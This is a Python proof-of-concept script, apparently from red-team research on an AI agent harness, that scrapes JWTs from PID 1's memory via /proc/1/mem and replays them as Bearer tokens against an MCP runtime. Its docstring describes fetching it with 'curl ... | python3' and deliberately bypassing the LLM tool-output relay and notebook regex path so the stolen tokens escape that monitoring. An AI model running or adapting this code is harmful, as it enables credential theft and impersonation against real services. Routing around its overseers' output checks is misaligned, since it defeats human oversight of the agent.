"""Notebook-14 §4.11 — in-harness JWT replay.

Bypasses the LLM-mediated relay entirely by replaying the lifted JWT against
the MCP runtime FROM INSIDE THE HARNESS. The JWT bytes are read from
/proc/1/mem and used directly as the Bearer token; they never traverse the
shell stdout → tool_result → eventstream → notebook regex path. Output is a
short PASS/FAIL summary line that's safe to relay.

Configuration is via environment variables (set inline by the calling
shell command), so the script body itself is static and cacheable.

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_jwt_replay.py and
fetched via `MCP_INVOKE_URL=... curl -sL <url> | python3` from the harness shell.
"""
import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.request


JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')


def lift_jwt():
    """Return the first JWT >= 200 bytes found in PID 1's writable-private anon heap."""
    regions = []
    with open('/proc/1/maps', 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 5:
                continue
            addr_range, perms = parts[0], parts[1]
            path = parts[5] if len(parts) >= 6 else ''
            if not perms.startswith('rw-') or path:
                continue
            try:
                start_s, end_s = addr_range.split('-')
                regions.append((int(start_s, 16), int(end_s, 16)))
            except Exception:
                continue

    seen = set()
    with open('/proc/1/mem', 'rb') as mem:
        for start, end in regions:
            try:
                mem.seek(start)
                chunk = mem.read(end - start)
            except Exception:
                continue
            for m in JWT_RE.finditer(chunk):
                jwt = m.group(0)
                if len(jwt) < 200:
                    continue
                if jwt in seen:
                    continue
                seen.add(jwt)
                yield jwt


def install_mcp():
    """Ensure the `mcp` package is available; install if missing."""
    try:
        import mcp  # noqa: F401
        return
    except ImportError:
        pass
    print('REPLAY_INSTALL_MCP=starting')
    res = subprocess.run(
        [sys.executable, '-m', 'pip', 'install', '-q', '--user', 'mcp>=1.10.0'],
        capture_output=True, timeout=180,
    )
    if res.returncode != 0:
        print(f'REPLAY_INSTALL_MCP=failed rc={res.returncode}')
        print(f'  stderr: {res.stderr[:500]!r}')
        sys.exit(1)
    print('REPLAY_INSTALL_MCP=done')


def replay_via_raw_http(mcp_url, jwt_bytes):
    """Replay via plain HTTPS POST (no MCP client lib). One initialize call,
    inspect status code. Faster than the full MCP handshake and avoids any
    library-side anyio/TaskGroup error-wrapping that obscures the real status."""
    body = json.dumps({
        'jsonrpc': '2.0', 'id': 1, 'method': 'initialize',
        'params': {
            'protocolVersion': '2024-11-05',
            'capabilities': {},
            'clientInfo': {'name': 'nb14-in-harness-replay', 'version': '0.1'},
        },
    }).encode()
    req = urllib.request.Request(
        mcp_url,
        data=body,
        headers={
            'Authorization': b'Bearer ' + jwt_bytes,  # bytes-as-Bearer; never decoded as text
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/event-stream',
        },
        method='POST',
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, resp.read()[:300]
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:300]


def main():
    mcp_url = os.environ.get('MCP_INVOKE_URL')
    if not mcp_url:
        print('REPLAY_FAIL reason=missing_MCP_INVOKE_URL')
        sys.exit(1)

    print(f'REPLAY_TARGET={mcp_url}')

    found = 0
    pass_count = 0
    fail_count = 0
    auth_errors = []

    for jwt_bytes in lift_jwt():
        found += 1
        # Quick local sanity: must have 3 parts.
        if jwt_bytes.count(b'.') != 2:
            print(f'JWT[{found}] skip reason=not_3_parts')
            continue
        # Try direct HTTPS replay.
        try:
            status, body = replay_via_raw_http(mcp_url, jwt_bytes)
        except Exception as e:
            print(f'JWT[{found}] error={type(e).__name__} {str(e)[:200]!r}')
            continue

        # Print verdict + length only (do NOT print the JWT bytes themselves).
        print(f'JWT[{found}] len={len(jwt_bytes)} status={status} body_excerpt={body[:200]!r}')
        if status == 200:
            pass_count += 1
        else:
            fail_count += 1
            auth_errors.append(body[:150])

    print()
    print(f'REPLAY_SUMMARY found={found} pass={pass_count} fail={fail_count}')
    if pass_count > 0:
        print('REPLAY_VERDICT=PASS')
        print('  At least one PID 1 JWT replays cleanly against the MCP runtime.')
        print('  >>> JWT exfil chain is REAL. Same-UID RCE -> bearer for the JWT TTL.')
    elif found == 0:
        print('REPLAY_VERDICT=NO_CANDIDATE')
        print('  No JWT-shaped bytes >= 200 chars found in PID 1 anon heap.')
    else:
        print('REPLAY_VERDICT=FAIL')
        print(f'  All {found} candidate(s) rejected by runtime auth.')
        print('  PID 1 bytes are NOT validly replayable. Defensive bound holds.')


if __name__ == '__main__':
    main()
